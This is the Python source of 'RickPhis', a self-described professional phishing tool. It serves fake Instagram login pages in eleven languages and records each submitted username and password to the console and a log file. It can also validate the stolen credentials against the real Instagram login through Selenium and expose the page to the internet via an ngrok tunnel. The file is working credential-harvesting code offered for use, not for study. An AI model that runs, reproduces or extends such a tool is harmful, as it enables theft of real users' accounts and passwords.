import platform
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, init
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from urllib.parse import unquote
import socket
from datetime import datetime
from webdriver_manager.firefox import GeckoDriverManager
from pyngrok import ngrok
import json
import random

init()

red_color = Fore.RED
white_color = Fore.WHITE
yellow_color = Fore.YELLOW
green_color = Fore.GREEN

current_datetime = datetime.now()
formatted_date = current_datetime.strftime("%d/%m/%Y %H:%M:%S")

logo = """  _____  _      _      _____  _     _     
 |  __ \\(_)    | |    |  __ \\| |   (_)    
 | |__) |_  ___| | __ | |__) | |__  _ ___ 
 |  _  /| |/ __| |/ / |  ___/| '_ \\| / __|
 | | \\ \\| | (__|   <  | |    | | | | \\__ \\
 |_|  \\_\\_|\\___|_|\\_\\ |_|    |_| |_|_|___/ V:2.3.6"""

print(f"{red_color}{logo}")
print(Fore.WHITE + "                         by https://github.com/Rickidevs\n")
print(Fore.RESET)

filehir = open("hir.txt", "r")
sentences = filehir.read().splitlines()
filehir.close()
random_sent = random.choice(sentences)
print(f"{yellow_color}[{green_color}HINT{yellow_color}]{white_color} {random_sent}\n")

path_separator = '\\' if platform.system() == 'Windows' else '/'

language_mapping = {
    'ar': f"htmls{path_separator}ar.html",
    'az': f"htmls{path_separator}az.html",
    'ch': f"htmls{path_separator}ch.html",
    'en': f"htmls{path_separator}index.html",
    'fr': f"htmls{path_separator}fr.html",
    'de': f"htmls{path_separator}de.html",
    'it': f"htmls{path_separator}it.html",
    'ko': f"htmls{path_separator}ko.html",
    'ru': f"htmls{path_separator}ru.html",
    'es': f"htmls{path_separator}es.html",
    'tr': f"htmls{path_separator}tr.html"
}

help_menu = f"""{Fore.WHITE}
RICK PHIS - PROFESSIONAL PHISHING TOOL

More Details: https://github.com/Rickidevs/RickPhis/blob/Main/README.md

set <args> <value>

show options  -- shows current settings
start         -- starts the phishing page
exit          -- terminates RickPhis

=======================
 Arguments  //  Values
=======================

lang       -- language of the phishing page (ar, az, ch, en, fr, de, it, ko, ru, es, tr)
port       -- port number (1-65535)
output     -- logs information (test.txt)
location   -- page to be redirected  (https://www.instagram.com/)
ngrok      -- ngrok token for tunel 
check      -- checks the accuracy of user information (true or false)
headless   -- runs selenium in the background (true or false)

"""

login_check = True

def check_trust(username, password, headless):
    global login_check
    options = webdriver.ChromeOptions()
    if headless:
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')  
        options.add_argument('--no-sandbox')  
        options.add_argument('--disable-dev-shm-usage')  
        options.add_argument("--window-size=1920,1080") 

    try:
        driver = webdriver.Chrome(options=options)
        driver.get("https://www.instagram.com/accounts/login/")

        user_field = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "username")))
        pass_field = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "password")))

        user_field.send_keys(username)
        pass_field.send_keys(password)

        login_button = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button._acan._acap._acas._aj1-._ap30")))
        login_button.click()

        error_message = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[@class='_ab2z']")))

        if error_message:
            login_check = False
            print(Fore.RED + "Login failed! The username or password is incorrect." + Fore.RESET)
        else:
            print(Fore.GREEN + "Login successful!" + Fore.RESET)
            login_check = True

    except Exception as e:
        print(f"An error occurred: {str(e)}")
    finally:
        driver.quit()


def get_error_message(lang_code):
    language_code = lang_code.lower()
    error_messages = {
        "ar": "عذرًا ، كلمة المرور خاطئة. يرجى التحقق من كلمة المرور الخاطئة.",
        "az": "Təəssüf edirəm, şifrə yanlışdır. Zəhmət olmasa, şifrəni yoxlayın.",
        "ch": "对不起，您的密码不正确。请检查您的密码。",
        "en": "Sorry, your password was incorrect. Please double-check your password.",
        "fr": "Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe.",
        "de": "Entschuldigung, Ihr Passwort ist falsch. Bitte überprüfen Sie Ihr Passwort.",
        "it": "Spiacenti, la password inserita non è corretta. Si prega di controllare nuovamente la password.",
        "ko": "죄송합니다. 비밀번호가 잘못되었습니다. 비밀번호를 다시 확인해주세요.",
        "ru": "Извините, ваш пароль неверен. Пожалуйста, проверьте свой пароль.",
        "tr": "Üzgünüz, şifreniz yanlış. Lütfen şifrenizi kontrol edin."
    }
    return error_messages.get(language_code, "Sorry, your password was incorrect. Please double-check your password.")


def find_empty_port(start_port=8000, end_port=65535):
    for port in range(start_port, end_port + 1):
        if not is_port_in_use(port):
            return port
    print("No free ports were found in the specified range.")
    return None

def is_port_in_use(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('localhost', int(port)))
        s.close()
        return False
    except OSError:
        return True

class ArgumentSettings:
    def __init__(self):
        self.port = 8000
        self.lang = 'en'
        self.output_file = None
        self.redirect_location = 'https://instagram.com'
        self.check_login = False
        self.ngrok_token = None
        self.headless_mode = False

    def set_option(self, option, value):
        if option.lower() in ['port']:
            if value.isdigit() and 1 <= int(value) <= 65535:
                print(f"{green_color}➜  PORT", value)
                self.port = int(value)
            else:
                print(Fore.RED + f"'{value}' is Invalid port number. Please enter a port number between 1 and 65535." + Fore.RESET)

        elif option.lower() in ['lang']:
            if value in language_mapping:
                print(f"{green_color}➜  LANG", value)
                self.lang = value
            else:
                print(Fore.RED + f"'{value}' is unsupported. Supported languages are: {', '.join(language_mapping.keys())}" + Fore.RESET)

        elif option.lower() in ['output']:
            print(f"{green_color}➜  OUTPUT", value)
            self.output_file = value

        elif option.lower() in ['location']:
            print(f"{green_color}➜  LOCATION", value)
            self.redirect_location = value

        elif option.lower() in ['check']:
            if value.lower() == 'true' or value.lower() == 'false':
                print(f"{green_color}➜  CHECK", value)
                self.check_login = value.lower() == 'true'
            else:
                print(Fore.RED + f"'{value}' is Invalid, Please use 'true' or 'false'." + Fore.RESET)

        elif option.lower() in ['ngrok-token', 'ngrok']:
            print(f"{green_color}➜  NGROK", value)
            self.ngrok_token = value

        elif option.lower() in ['headless']:
            if value.lower() == 'true' or value.lower() == 'yes':
                print(f"{green_color}➜  HEADLESS", value)
                self.headless_mode = True
            elif value.lower() == 'false' or value.lower() == 'no':
                print(f"{green_color}➜  HEADLESS", value)
                self.headless_mode = False
            else:
                print(Fore.RED + f"'{value}' is Invalid, Please use 'true' or 'false'." + Fore.RESET)

        else:
            print(Fore.RED + f"Unknown option '{option}'. Please enter a valid option." + Fore.RESET)


    def show_options(self):
        options = {
            f'――――――――――――――――――――――――――――――――\n{yellow_color}Port{white_color}':         self.port,
            f'――――――――――――――――――――――――――――――――\n{yellow_color}Lang{white_color}':         self.lang,
            f'――――――――――――――――――――――――――――――――\n{yellow_color}Output{white_color}':       self.output_file,
            f'――――――――――――――――――――――――――――――――\n{yellow_color}Location{white_color}':     self.redirect_location,
            f'――――――――――――――――――――――――――――――――\n{yellow_color}Check{white_color}':        self.check_login,
            f'――――――――――――――――――――――――――――――――\n{yellow_color}Ngrok-token{white_color}':  self.ngrok_token,
            f'――――――――――――――――――――――――――――――――\n{yellow_color}Headless{white_color}':     self.headless_mode
        }
        for option, value in options.items():
            print(f"{option}: {value}")
        print("――――――――――――――――――――――――――――――――")

argument_settings = ArgumentSettings()

def main():
    try:
        while True:
            user_input = input(Fore.BLUE + "Phish: " + Fore.RESET).strip().split()
            if 'help' in user_input or '-h' in user_input or '--help' in user_input:
                print(help_menu)
                continue
            elif 'show' in user_input and 'options' in user_input:
                argument_settings.show_options()
                continue
            elif 'set' in user_input and len(user_input) > 1:
                option = user_input[1]
                value = ' '.join(user_input[2:])
                argument_settings.set_option(option, value)
                continue
            elif 'exit' in user_input:
                print(f"{red_color}RickPhis Terminated..{Fore.RESET}")
                break
            elif 'clear' in user_input or 'cls' in user_input:
                if platform.system() == 'Windows':
                    os.system('cls')
                else:
                    os.system('clear')

                print(f"{red_color}{logo}")
                print(Fore.WHITE + "\n                     by https://github.com/Rickidevs\n")
                print(Fore.RESET)

                filehir = open("hir.txt", "r")
                sentences = filehir.read().splitlines()
                filehir.close()
                random_sent = random.choice(sentences)
                print(f"{yellow_color}[{green_color}HINT{yellow_color}]{white_color} {random_sent}\n")
                continue

            elif 'start' in user_input:
                start_server(argument_settings.port, argument_settings.lang, argument_settings.output_file, argument_settings.redirect_location, argument_settings.check_login, argument_settings.ngrok_token, argument_settings.headless_mode)
                continue
            else:
                print(f"{red_color}'{user_input[0]}' is Invalid command. Type 'help' to see available commands")
    except IndexError:
        main()
    except KeyboardInterrupt:
        print(f"{red_color}RickPhis Terminated..{Fore.RESET}")

def start_server(port, lang, output_file, redirect_location, check_login, ngrok_token, headless_mode):
    class MyHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/':
                self.path = language_mapping.get(lang, 'index.html')
            try:
                file_path = os.path.abspath(os.path.join(os.getcwd(), self.path.strip('/')))
                if os.path.exists(file_path):
                    if file_path.endswith('.css'):
                        with open(file_path, 'rb') as file:
                            content = file.read()
                            self.send_response(200)
                            self.send_header('Content-type', 'text/css')
                            self.end_headers()
                            self.wfile.write(content)
                    elif file_path.endswith('.js'):
                        with open(file_path, 'rb') as file:
                            content = file.read()
                            self.send_response(200)
                            self.send_header('Content-type', 'application/javascript')
                            self.end_headers()
                            self.wfile.write(content)
                    else:
                        with open(file_path, 'rb') as file:
                            content = file.read()
                            self.send_response(200)
                            self.send_header('Content-type', 'text/html')
                            self.end_headers()
                            self.wfile.write(content)
                else:
                    self.send_error(404, f'File Not Found: {self.path}')
            except Exception as e:
                self.send_error(500, f'Internal Server Error: {e}')


        def do_POST(self):
            global login_check
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                post_data = post_data.split('&')
                data_dict = {}
                for item in post_data:
                    key, value = item.split('=')
                    data_dict[key] = value
                
                sel_username = unquote(data_dict.get('username', ''))
                sel_password = unquote(data_dict.get('password', ''))
                
                print(f"{Fore.BLUE}[{formatted_date}] {Fore.RED}Username: {sel_username}")
                print(f"{Fore.BLUE}[{formatted_date}] {Fore.RED}Password: {sel_password}{Fore.RESET}")
                
                log_message = ""
                if output_file:
                    log_message = f"[{formatted_date}] Username: {sel_username}\n" \
                                f"[{formatted_date}] Password: {sel_password}\n"
                    with open(output_file, 'a') as file:
                        file.write(log_message)
                
                if check_login:
                    check_trust(sel_username, sel_password, headless_mode)
                
                response = {}
                if login_check:
                    response['status'] = 'success'
                    response['redirect'] = redirect_location
                else:
                    response['status'] = 'error'
                    response['error_msg'] = get_error_message(lang)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())

            except Exception as e:
                self.send_error(500, f'Failed to process POST request: {e}')



    c_port = find_empty_port(start_port=port)
    if c_port:
        try:
            server = HTTPServer(('localhost', c_port), MyHTTPRequestHandler)
            
            if ngrok_token:
                ngrok.set_auth_token(ngrok_token)
                ngrok_tunnel = ngrok.connect(c_port)
                ngrok_url = ngrok_tunnel.public_url
                print(f"{Fore.WHITE}\nNgrok URL: {green_color}{ngrok_url}\n", Fore.RESET)
            else:
                ngrok_url = f"http://localhost:{c_port}/"
                print(f"{Fore.WHITE}Local Server URL: {green_color}{ngrok_url}", Fore.RESET)

            print(f"{yellow_color}you cannot enter commands after this step. use CTRL+C for exit{Fore.RESET}\n")
            
            server.serve_forever()
        except Exception as e:
            print(Fore.RED, f"Failed to start server: {e}")
    else:
        print(Fore.RED, "No free port found")

if __name__ == "__main__":
    main()
